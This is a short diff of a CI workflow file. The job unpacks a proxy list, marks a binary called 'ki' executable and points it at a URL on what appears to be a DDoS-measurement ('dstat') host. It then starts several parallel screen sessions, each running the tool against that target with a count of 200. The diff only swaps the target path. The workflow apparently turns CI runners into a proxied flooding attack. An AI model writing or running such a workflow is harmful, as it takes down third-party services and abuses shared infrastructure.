@@ -34,7 +34,7 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x ki
-          export TARGET="https://c3.dstatbot.win/yX5vXTgP"
+          export TARGET="https://c3.dstatbot.win/NGdxdCD1"
           screen -dms ve ./ki $TARGET 200 1 1 
           screen -dms ve ./ki $TARGET 200 1 1 
           screen -dms ve ./ki $TARGET 200 1 1
